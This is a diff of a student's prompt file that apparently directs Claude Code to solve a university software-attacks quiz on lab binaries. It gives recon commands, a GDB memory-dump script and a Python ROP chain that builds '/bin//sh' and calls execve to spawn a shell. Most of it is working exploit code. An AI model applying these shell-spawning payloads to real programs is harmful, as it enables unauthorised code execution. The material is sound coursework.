@@ -1,272 +1,169 @@
-# Quiz 4 — Next Session Prompt (Quiz Day, Group 6)
-
-Paste this entire file as your first message to Claude Code on quiz day.
+# Quiz Day Prompt — Paste This as Your First Message
 
 ---
 
-## Context
+You are helping me solve EPL326 (Software Attacks, University of Cyprus) Quiz 4 on quiz day.
+I am student `apieri01`, group 6.
 
-EPL326 Software Attacks, University of Cyprus — Quiz 4.
-I am student apieri01, group 6. I have already solved the 4 example binaries (bin2 set + g1 set).
-On quiz day I will receive 2 new binaries (group 6 set). Apply the **exact same methodology** as before.
+## Your first actions — do these before anything else:
 
-All solved examples and tools are in: `C:\Users\andre\Desktop\quiz_4_universal\`
+1. **Read these files in order** (they are in `C:\Users\andre\Desktop\326_quiz3\`):
+   - `LLM_INSTRUCTIONS.md` — full attack methodology, decision tree, GDB workflow, ROP chain construction
+   - `README.md` — all solved sets with payloads, gadget tables, confirmed addresses
+   - `FINDINGS.md` — step-by-step findings from Quiz 4 example sets (bin2 + g1), confirmed via GDB
+   - `STATUS.md` — confirmed values: gadget_base, OFFSET, WR_ADDR, results table
+   - `SSH_SETUP.md` — how to connect to the lab machine from a lab machine
 
----
+2. **Understand the established methodology** before touching any binary:
+   - Quiz 4 binaries all use `mmap + movb` dynamic gadget building in `main()`
+   - The same gadget bytes appear in different ORDER across bin.1 and bin.2 — decode fresh each time
+   - `gadget_base` formula is off by 8 — always verify via GDB memory dump
+   - OFFSET differs between binaries — always read `lea -0xNN(%ebp)` in `display_file` per binary
+   - Never use `.bss` as WR_ADDR — always use `mmap_base + 0x500`
 
-## SSH Connection
+3. **SSH to the lab machine** using the instructions in `SSH_SETUP.md`:
+   - You are already on a lab machine — use `ssh lab103` (key is in NFS home `~/.ssh/lab_key`)
+   - Or: `ssh -i ~/.ssh/lab_key -o StrictHostKeyChecking=no apieri01@10.16.13.89`
+   - If 10.16.13.89 is down, try other 103wsX IPs in the 10.16.13.x range
+   - Once connected: `cd ~/326_quiz3` (repo is already cloned there)
+   - If repo not present: `git clone https://github.com/andreas1612/326_quiz3.git ~/326_quiz3`
 
-### On Quiz Day: lab-to-lab (from your assigned lab machine → 103ws)
-The quiz binaries are on 103wsX machines. From your assigned lab machine:
-```bash
-# SSH key is in NFS home (~/.ssh/lab_key) — same key works from any lab machine
-ssh -i ~/.ssh/lab_key -o StrictHostKeyChecking=no apieri01@10.16.13.89
-# If 10.16.13.89 (103ws14) is down, try: 10.16.13.88, 10.16.13.90, etc.
-# No VPN needed — you're already on the internal network
-```
-
-Copy files from your lab machine to 103ws:
-```bash
-scp -i ~/.ssh/lab_key /path/to/script.py apieri01@10.16.13.89:~/script.py
-```
-
-Or clone this repo directly on 103ws:
-```bash
-git clone https://github.com/andreas1612/326_quiz3.git ~/quiz4
-# Then use ~/quiz4/tools/find_gadgets.py and solve_rop_template.py
-```
-
-### From Windows (prep/home):
-```powershell
-# From PowerShell (NOT Git Bash or WSL — they mangle quotes/paths)
-ssh -i C:\Users\andre\.ssh\lab_key -o StrictHostKeyChecking=no apieri01@10.16.13.89
-scp -i C:\Users\andre\.ssh\lab_key C:\tmp\script.py apieri01@10.16.13.89:~/script.py
-```
+4. **I will tell you where the quiz binaries are.** Upload them to the lab:
+   ```bash
+   mkdir -p ~/quiz4_examples/g6
+   scp -i ~/.ssh/lab_key /path/to/bin.1 /path/to/bin.2 apieri01@10.16.13.89:~/quiz4_examples/g6/
+   ```
 
 ---
 
-## What Was Already Solved
+## What to do with the quiz binaries
 
-All 4 example binaries → `uid=9992(apieri01)` confirmed:
+Follow the exact workflow from `FINDINGS.md` and `LLM_INSTRUCTIONS.md`:
 
-| Binary | Set | OFFSET | gadget_base |
-|--------|-----|--------|-------------|
-| bin.1 | bin2 | 56 | 0x070493e0 |
-| bin.2 | bin2 | 56 | 0x070493e0 |
-| bin.1 | g1 | 52 | 0x070493e0 |
-| bin.2 | g1 | 52 | 0x070493e0 |
-
-Exploit scripts on lab: `~/fix_g1.py`, `~/solve_final.sh`
-
----
-
-## Key Confirmed Values (from GDB)
-
-```
-mmap_base   = 0x07049000
-gadget_base = 0x070493e0   ← empirical (formula gives 0x070493e8, off by 8)
-WR_ADDR     = 0x07049500   ← mmap_base + 0x500 (MAP_ANONYMOUS zeroed)
-```
-
-The mmap_base formula (for reference):
-```python
-hardcoded_addr = 0x0804942a  # push before mmap in main()
-pagesize = 0x1000
-mmap_base = (hardcoded_addr // pagesize - 0x1000) * pagesize  # 0x07049000
-# Then gadget_base = mmap_base + offset(TEMP) where TEMP=1000
-# offset() loop: while x > 0x3e8: x -= 0x64; return x → gives 0x3e8
-# But actual is +0x3e0 — ALWAYS verify via GDB!
-```
-
----
-
-## Step-by-Step Solve Methodology
-
-### Step 0 — Get tools and binaries on 103ws
-
-**On quiz day (from your lab machine):**
+### Step 1 — Recon (30 seconds each)
 ```bash
-# Clone repo to get tools (or it may already be there from prep)
-git clone https://github.com/andreas1612/326_quiz3.git ~/quiz4
-mkdir -p ~/quiz4_examples/g6
-
-# Copy quiz binaries to 103ws (binaries are given to you on your assigned machine)
-scp -i ~/.ssh/lab_key bin.1 bin.2 apieri01@10.16.13.89:~/quiz4_examples/g6/
-
-# Or if binaries are already on 103ws in your home dir, just use them directly
-```
-
-### Step 1 — Recon
-```bash
-cd ~/quiz4_examples
-readelf -l g6/bin.1 | grep GNU_STACK   # RW = NX on (need ROP)
-readelf -h g6/bin.1 | grep Type        # EXEC = no PIE
-objdump -d g6/bin.1 | grep -E "^[0-9a-f]+ <"  # list functions
+readelf -l ./bin.X | grep GNU_STACK   # expect RW (NX on)
+readelf -h ./bin.X | grep Type        # expect ET_EXEC (no PIE)
+objdump -d ./bin.X | grep -E "^[0-9a-f]+ <"  # list functions
 ```
 
 ### Step 2 — Confirm mmap+movb pattern
 ```bash
-objdump -d g6/bin.1 | sed -n '/<main>/,/^$/p' | grep -E "mmap|movb" | head -20
+objdump -d ./bin.X | sed -n '/<main>/,/<__libc_csu_init>/p' | grep -E "mmap|movb"
 ```
-Expected: `mmap` call + many `movb $0xNN, offset(%eax)` instructions.
+Expected: dozens of `movb` lines + `call mmap@plt`. This confirms dynamic gadget building.
 
-### Step 3 — Run find_gadgets.py
+### Step 3 — Decode gadget table from movb bytes
 ```bash
-python3 ~/tools/find_gadgets.py g6/bin.1
-python3 ~/tools/find_gadgets.py g6/bin.2
+objdump -d ./bin.X | sed -n '/<main>/,/<__libc_csu_init>/p' | grep "movb"
 ```
-Gadgets will show NOT FOUND (they're dynamic). Use the `.data` address shown as WR_ADDR fallback if needed, but prefer mmap_base+0x500.
+Read `$0xNN` values in order. Every 3 bytes = one gadget (2-byte instruction + `0xc3` ret).
+Map bytes to gadgets using the reference card in `README.md` Section 6 / `LLM_INSTRUCTIONS.md` Section C.
 
-### Step 4 — Decode movb table (gadget order)
+### Step 4 — Calculate mmap_base, then verify gadget_base via GDB
+Find the hardcoded address pushed before `call mmap` in main():
 ```bash
-# Extract movb bytes from main — gives the order gadgets are written
-objdump -d g6/bin.1 | awk '/<main>/{f=1} f{print} /^$/{if(f)exit}' | grep "movb"
+objdump -d ./bin.X | sed -n '/<main>/,/<__libc_csu_init>/p' | grep -B5 "mmap"
 ```
-Or more reliably:
-```bash
-objdump -d g6/bin.1 | grep -A200 "<main>:" | grep "movb" | head -30
-```
+Formula: `mmap_base = (hardcoded_addr // 0x1000 - 0x1000) * 0x1000`
+Expected (from example sets): `mmap_base = 0x07049000`
 
-Decode each `movb $0xNN, 0xOFFSET(%eax)` line:
-- Group by target offset (0, 1, 2 per gadget slot)
-- Each 3-byte group = one gadget
-- OFFSET order determines gadget address order at gadget_base
-
-Known gadget byte patterns:
-```
-31 c0 c3  → xor eax,eax; ret
-58 5b c3  → pop eax; pop ebx; ret
-89 03 c3  → mov [ebx],eax; ret
-31 c9 c3  → xor ecx,ecx; ret
-89 c3 c3  → mov ebx,eax; ret
-31 d2 c3  → xor edx,edx; ret
-b0 0b c3  → mov al,0xb; ret
-cd 80 c3  → int 0x80; ret
-```
-
-### Step 5 — Find OFFSET (buffer overflow size)
-```bash
-objdump -d g6/bin.1 | awk '/<display_file>/{f=1} f{print} /<root_menu>/{exit}' | grep "lea"
-```
-Find `lea -0xNN(%ebp),%eax` just before `call memcpy`.
-**OFFSET = NN + 4** (the +4 accounts for saved EBP).
-
-Common values seen: 56 (from -0x34) or 52 (from -0x30). Check both bin.1 and bin.2 separately!
-
-### Step 6 — Verify gadget_base via GDB
-
-Write this to `C:\tmp\gdb_verify.py` then SCP to lab:
+**Always verify gadget_base via GDB** — formula can be off by 8:
 ```python
+# Write to /tmp/gdb_verify.py then run:
 import gdb
 gdb.execute("set pagination off")
-gdb.execute("b *0x8049376")   # after memcpy in display_file
-gdb.execute("run g6/exploit.1")
-ebp = int(gdb.parse_and_eval("$ebp"))
-print("EBP = %s" % hex(ebp))
+gdb.execute("b *0x8049376")   # after memcpy in display_file — adjust if different binary
+gdb.execute("run g6/exploit.dummy")
 for i in range(0, 32, 4):
     addr = 0x070493e0 + i
-    try:
-        v = int(gdb.parse_and_eval("*((unsigned int*)%d)" % addr))
-        b = v.to_bytes(4, 'little')
-        print("0x%08x: %s" % (addr, ' '.join('%02x'%x for x in b)))
-    except:
-        print("0x%08x: ERROR" % addr)
+    v = int(gdb.parse_and_eval("*((unsigned int*)%d)" % addr))
+    b = v.to_bytes(4, 'little')
+    print("0x%08x: %s" % (addr, ' '.join('%02x'%x for x in b)))
 gdb.execute("quit")
 ```
-Run:
 ```bash
-# Create a dummy exploit first (any file of correct length) then:
-python3 -c "print('60 ' + 'A'*60)" > g6/exploit.1
+python3 -c "print('60 ' + 'A'*60)" > g6/exploit.dummy
 env -i TEMP=1000 HOME=~ PATH=/usr/bin:/bin setarch i686 -R --3gb \
-  gdb -batch -ex "source /tmp/gdb_verify.py" g6/bin.1 2>&1 | grep -E "EBP|0x070"
+  gdb -batch -ex "source /tmp/gdb_verify.py" g6/bin.1 2>&1 | grep "0x07049"
 ```
+The address where you see `31 c0 c3` or `58 5b c3` at the start = actual gadget_base.
 
-**NOTE**: The breakpoint address 0x8049376 is from `display_file` after memcpy. If it's different for the quiz binaries, find it:
+### Step 5 — Find OFFSET from display_file disassembly
 ```bash
-objdump -d g6/bin.1 | awk '/<display_file>/{f=1} f{print} /<root_menu>/{exit}' | grep -A2 "memcpy"
+objdump -d ./bin.X | awk '/<display_file>/{f=1} f{print} /<root_menu>/{exit}' | grep "lea"
 ```
+Find `lea -0xNN(%ebp),%eax` before `call memcpy`. OFFSET = NN + 4.
+- Seen in examples: `0x34` → OFFSET=56, `0x30` → OFFSET=52
+- Check both bin.1 and bin.2 — they can differ.
 
-### Step 7 — Build ROP chain
+### Step 6 — Build and test exploit
+Use `~/326_quiz3/tools/solve_rop_template.py` as base. WR_ADDR = mmap_base + 0x500.
 
-Write `C:\tmp\solve_g6.py`:
+Chain structure (from `FINDINGS.md`):
 ```python
-#!/usr/bin/env python3
 import struct
-
 def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)
-
-gb = 0x070493e0       # confirm via GDB!
-WR_ADDR = 0x07049500  # mmap_base + 0x500
-
-# Fill these in after decoding movb table:
-OFFSET = 56           # from Step 5
-G_POP_EAX_POP_EBX = gb + ???   # 58 5b c3
-G_MOV_EBXPTR_EAX  = gb + ???   # 89 03 c3
-G_MOV_EBX_EAX     = gb + ???   # 89 c3 c3
-G_XOR_ECX_ECX     = gb + ???   # 31 c9 c3
-G_XOR_EDX_EDX     = gb + ???   # 31 d2 c3
-G_XOR_EAX_EAX     = gb + ???   # 31 c0 c3
-G_MOV_AL_0B       = gb + ???   # b0 0b c3
-G_INT_80          = gb + ???   # cd 80 c3
-
+gb = <gadget_base>; WR = 0x07049500; OFFSET = <from step 5>
 chain  = b'A' * OFFSET
-chain += p32(G_POP_EAX_POP_EBX) + b'/bin' + p32(WR_ADDR)   + p32(G_MOV_EBXPTR_EAX)
-chain += p32(G_POP_EAX_POP_EBX) + b'//sh' + p32(WR_ADDR+4) + p32(G_MOV_EBXPTR_EAX)
-chain += p32(G_POP_EAX_POP_EBX) + p32(WR_ADDR) + p32(0x41414141) + p32(G_MOV_EBX_EAX)
-chain += p32(G_XOR_ECX_ECX)
-chain += p32(G_XOR_EDX_EDX)
-chain += p32(G_XOR_EAX_EAX)
-chain += p32(G_MOV_AL_0B)
-chain += p32(G_INT_80)
-
+chain += p32(G_POP) + b'/bin' + p32(WR)   + p32(G_MPTR)
+chain += p32(G_POP) + b'//sh' + p32(WR+4) + p32(G_MPTR)
+chain += p32(G_POP) + p32(WR) + p32(0x41414141) + p32(G_MEBX)
+chain += p32(G_XECX) + p32(G_XEDX) + p32(G_XEAX) + p32(G_MOVAL) + p32(G_INT80)
 data = str(len(chain)).encode() + b' ' + chain
-with open('g6/exploit.1', 'wb') as f:
-    f.write(data)
-print('[+] exploit.1 written, payload length:', len(chain))
+with open('g6/exploit.1', 'wb') as f: f.write(data)
 ```
 
-SCP and run:
-```powershell
-scp -i C:\Users\andre\.ssh\lab_key C:\tmp\solve_g6.py apieri01@10.16.13.89:~/solve_g6.py
-```
-```bash
-cd ~/quiz4_examples && python3 ~/solve_g6.py
-```
-
-### Step 8 — Verify
+### Step 7 — Verify
 ```bash
 echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb g6/bin.1 g6/exploit.1
 echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb g6/bin.2 g6/exploit.2
 ```
-Expected output: `uid=XXXX(apieri01)` or similar.
+Expected: `uid=9992(apieri01) gid=3633(cs24) groups=3633(cs24)`
 
 ---
 
-## Quick Gadget Decode Cheatsheet
+## Key numbers to re-use from example sets (verify these hold for group 6!)
 
-Given movb output like:
-```
-movb $0x31, 0x0(%eax)   # byte 0 of slot 0
-movb $0xc0, 0x1(%eax)   # byte 1 of slot 0
-movb $0xc3, 0x2(%eax)   # byte 2 of slot 0
-movb $0x58, 0x3(%eax)   # byte 0 of slot 1
-movb $0x5b, 0x4(%eax)   # byte 1 of slot 1
-movb $0xc3, 0x5(%eax)   # byte 2 of slot 1
-...
-```
-→ Slot 0 at `gb+0x00` = `31 c0 c3` = xor_eax  
-→ Slot 1 at `gb+0x03` = `58 5b c3` = pop_pop  
-
-Each slot is 3 bytes. 8 gadgets × 3 = 24 bytes total.
+| Value | Example sets | Action |
+|-------|-------------|--------|
+| gadget_base | `0x070493e0` | Verify via GDB — may differ for new binaries |
+| mmap_base | `0x07049000` | Recompute from hardcoded_addr in new binary |
+| WR_ADDR | `0x07049500` | Always mmap_base+0x500, never .bss |
+| OFFSET bin.1 | 56 or 52 | Read `lea -0xNN(%ebp)` fresh for each binary |
+| OFFSET bin.2 | 56 or 52 | Read `lea -0xNN(%ebp)` fresh for each binary |
+| Gadget bytes | Same 8 gadgets | ORDER may differ — decode movb table fresh |
 
 ---
 
-## Critical Pitfalls
+## Critical warnings (from FINDINGS.md)
 
-1. **Gadget ORDER differs between bin.1 and bin.2** — decode movb table fresh for each binary
-2. **OFFSET differs between binaries** — always check `lea -0xNN(%ebp)` in display_file for each binary
-3. **gadget_base formula ≈ correct but verify via GDB** — was off by 8 in examples (0x3e8 vs 0x3e0)
-4. **Never use .bss as WR_ADDR** — bin.2 variants have init_data() that poisons .bss with 0xffffffff
-5. **File format**: `"SIZE PAYLOAD"` — `str(len(chain)).encode() + b' ' + chain`
-6. **Use PowerShell for SSH/SCP** — Git Bash/WSL mangle quotes and interpret `<` as redirects
-7. **EBP-based OFFSET**: `lea -0x34(%ebp)` → buf starts at ebp-0x34 → overflow needs 0x34+4=56 bytes
+- **Gadget order differs between bin.1 and bin.2** — never copy gadget offsets between binaries
+- **gadget_base formula can be off by 8** — always dump memory at formula result ± 16 bytes
+- **Never use .bss as WR_ADDR** — init_data() or TEMP value may poison it → execve fails silently
+- **g1/bin.1 had INT80 and MOVAL swapped at +0x12/+0x15** — verify byte values, not just offsets
+- **Breakpoint address in GDB (`0x8049376`)** is from example sets — if display_file differs, find the instruction after `call memcpy` for the new binary via objdump
+
+---
+
+## Tools on lab machine (~/326_quiz3/tools/)
+
+```bash
+python3 ~/326_quiz3/tools/find_gadgets.py ./bin.X    # won't find dynamic gadgets, but confirms mmap pattern
+cp ~/326_quiz3/tools/solve_rop_template.py ./solve_g6.py  # fill in addresses and run
+```
+
+---
+
+## If something fails
+
+1. **Segfault, no output** → wrong OFFSET or wrong gadget address
+   - Re-read `lea -0xNN(%ebp)` in display_file
+   - Re-dump gadget memory via GDB at suspected gadget_base ± 16 bytes
+2. **execve returns -1, no output** → WR_ADDR has no null terminator
+   - Confirm you're using mmap_base+0x500, not .bss
+3. **Nothing runs** → check `int 0x80` exists: `objdump -d bin.X | grep "int.*0x80"`
+4. **GDB breakpoint doesn't hit** → display_file address changed, find new breakpoint:
+   `objdump -d bin.X | awk '/<display_file>/{f=1} f{print} /<root_menu>/{exit}' | grep -A2 "memcpy"`
+
+Detailed failure diagnosis in `LLM_INSTRUCTIONS.md` Section C → "ROP failure diagnosis" table.
